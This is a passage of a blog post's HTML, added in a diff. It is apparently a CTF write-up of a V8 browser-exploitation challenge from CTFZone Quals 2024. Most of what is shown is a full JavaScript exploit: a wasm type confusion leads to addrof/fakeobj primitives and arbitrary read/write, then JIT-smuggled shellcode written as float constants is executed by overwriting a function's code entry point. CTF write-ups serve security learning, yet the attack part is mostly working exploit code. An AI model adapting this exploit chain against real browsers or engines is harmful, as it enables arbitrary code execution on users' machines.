+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">lower</span>(<span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">pwn_addr</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span><span style="color:#a6e22e">n</span>));
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_entry_rwx</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">code</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">code</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>,<span style="color:#a6e22e">code_entry_rwx</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x60</span><span style="color:#a6e22e">n</span>);
+</span></span></code></pre></div><p>We smuggle the shellcode into the jitted function by converting it into floating-point numbers so that it is stored in hexadecimal form in memory. So we overwrite the code entry point to starting of the smuggled shellcode.</p>
+<p><img src="/wasminator/exp.gif"
+	
+	
+	
+	loading="lazy"
+	
+		alt="pwned"
+	
+	
+></p>
+<h2 id="full-exploit">Full Exploit
+</h2><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">d8</span>.<span style="color:#a6e22e">file</span>.<span style="color:#a6e22e">execute</span>(<span style="color:#e6db74">&#39;test/mjsunit/wasm/wasm-module-builder.js&#39;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">fi_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ArrayBuffer</span>(<span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">f_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Float64Array</span>(<span style="color:#a6e22e">fi_buf</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i_buf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">BigUint64Array</span>(<span style="color:#a6e22e">fi_buf</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">f</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">f_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">f</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i_buf</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">i_buf</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">f_buf</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">lower</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xffffffff</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">upper</span>(<span style="color:#a6e22e">i</span>){ 
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> (<span style="color:#a6e22e">i</span><span style="color:#f92672">&gt;&gt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>)<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">BigInt</span>(<span style="color:#ae81ff">0xffffffff</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">i</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">start</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">content</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">i</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">start</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;0x&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">content</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">pwn</span>(){
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> [
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">1.95538254221075331056310651818</span><span style="color:#a6e22e">E</span><span style="color:#f92672">-</span><span style="color:#ae81ff">246</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">1.95606125582421466942709801013</span><span style="color:#a6e22e">E</span><span style="color:#f92672">-</span><span style="color:#ae81ff">246</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">1.99957147195425773436923756715</span><span style="color:#a6e22e">E</span><span style="color:#f92672">-</span><span style="color:#ae81ff">246</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">1.95337673326740932133292175341</span><span style="color:#a6e22e">E</span><span style="color:#f92672">-</span><span style="color:#ae81ff">246</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#ae81ff">2.63486047652296056448306022844</span><span style="color:#a6e22e">E</span><span style="color:#f92672">-</span><span style="color:#ae81ff">284</span>];
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr1</span> <span style="color:#f92672">=</span> [{}];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">arr2</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>];
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#66d9ef">let</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10000</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pwn</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">builder</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">WasmModuleBuilder</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">builder</span>.<span style="color:#a6e22e">addArray</span>(<span style="color:#a6e22e">kWasmI32</span>, <span style="color:#66d9ef">true</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">builder</span>.<span style="color:#a6e22e">addFunction</span>(<span style="color:#e6db74">&#39;createArray&#39;</span>, <span style="color:#a6e22e">makeSig</span>([<span style="color:#a6e22e">kWasmI32</span>], [<span style="color:#a6e22e">kWasmExternRef</span>]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  .<span style="color:#a6e22e">addBody</span>([
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kExprLocalGet</span>, <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kGCPrefix</span>, <span style="color:#a6e22e">kExprArrayNewDefault</span>, <span style="color:#a6e22e">array</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">kGCPrefix</span>, <span style="color:#a6e22e">kExprExternConvertAny</span>,
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>          ])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    .<span style="color:#a6e22e">exportFunc</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">write_val</span>(<span style="color:#a6e22e">arr</span>,<span style="color:#a6e22e">val</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">val</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">instance</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">builder</span>.<span style="color:#a6e22e">instantiate</span>({});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">wasm</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">instance</span>.<span style="color:#a6e22e">exports</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">w_array</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">wasm</span>.<span style="color:#a6e22e">createArray</span>(<span style="color:#ae81ff">0x082d0641</span><span style="color:#f92672">+</span><span style="color:#ae81ff">8</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">w_array</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xffff</span>;
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Target arr length --&gt; &#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">arr2</span>.<span style="color:#a6e22e">length</span>) 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">obj</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr1</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">obj</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">lower</span>(<span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">arr2</span>[<span style="color:#ae81ff">2</span>]));
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">addr</span>){
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">arr2</span>[<span style="color:#ae81ff">2</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">addr</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">arr1</span>[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">addr</span>,<span style="color:#a6e22e">val</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">temp</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>((<span style="color:#ae81ff">0x1fffe</span><span style="color:#a6e22e">n</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">addr</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">fake_object</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>(<span style="color:#a6e22e">val</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">addr</span>){
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">temp</span>[<span style="color:#ae81ff">1</span>]<span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>((<span style="color:#ae81ff">0x1fffe</span><span style="color:#a6e22e">n</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>)<span style="color:#f92672">+</span><span style="color:#a6e22e">addr</span><span style="color:#f92672">-</span><span style="color:#ae81ff">8</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">ftoi</span>(<span style="color:#a6e22e">fake_object</span>[<span style="color:#ae81ff">0</span>]);
+</span></span><span style="display:flex;"><span>} 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">let</span> <span style="color:#a6e22e">temp</span> <span style="color:#f92672">=</span> [<span style="color:#ae81ff">1.1</span>,<span style="color:#ae81ff">1.1</span>]
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#a6e22e">itof</span>(<span style="color:#ae81ff">0x08000725081cce15</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp</span>[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span><span style="color:#a6e22e">itof</span>(<span style="color:#ae81ff">0x1fffe</span><span style="color:#a6e22e">n</span><span style="color:#f92672">&lt;&lt;</span><span style="color:#ae81ff">32</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">temp_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">temp</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">temp_addr</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">fake_object</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fakeobj</span>(<span style="color:#a6e22e">temp_addr</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x20</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwn_addr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">addrof</span>(<span style="color:#a6e22e">pwn</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">pwn_addr</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0xc</span><span style="color:#a6e22e">n</span>) <span style="color:#f92672">&amp;</span><span style="color:#ae81ff">0xffffffff</span><span style="color:#a6e22e">n</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">hex</span>(<span style="color:#a6e22e">code</span>.<span style="color:#a6e22e">toString</span>(<span style="color:#ae81ff">16</span>)));
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">var</span> <span style="color:#a6e22e">code_start</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">arb_read</span>(<span style="color:#a6e22e">code</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">arb_write</span>(<span style="color:#a6e22e">code</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x14</span><span style="color:#a6e22e">n</span>,<span style="color:#a6e22e">code_start</span><span style="color:#f92672">+</span><span style="color:#ae81ff">0x60</span><span style="color:#a6e22e">n</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#34;Pwned!!&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">pwn</span>();
+</span></span></code></pre></div><h2 id="conclusion">Conclusion
+</h2><p>It was fun solving this, thanks to @phoen1xxx for helping me out with the challenge. If you find any mistakes or have any doubts/suggestions feel free to <a class="link" href="https://twitter.com/0xspektre"  target="_blank" rel="noopener"
+    >contact me</a> :)</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/ctfzone-quals-2024/">CTFZone Quals 2024</a>
+        
+            <a href="/tags/v8/">V8</a>
+        
+            <a href="/tags/browser-exploitation/">Browser Exploitation</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">Related content</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/post/v8-internals-1/v8_internals_1/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">V8 Internals - Understanding V8 Compiler Pipeline</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/post/cve-2023-2033/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">The Holy Hole - Analysis of CVE-2023-2033</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+            2024 - 
+        
+        2025 spektre&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        
+            © 2025 spektre. All rights reserved. <br/>
+        Built with <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> <br />
+        Theme <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> designed by <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a>
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.c4c6f77d20c3a4b8c34274cb3cea4603317114a7a5df549091aa546fa8b95e16.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
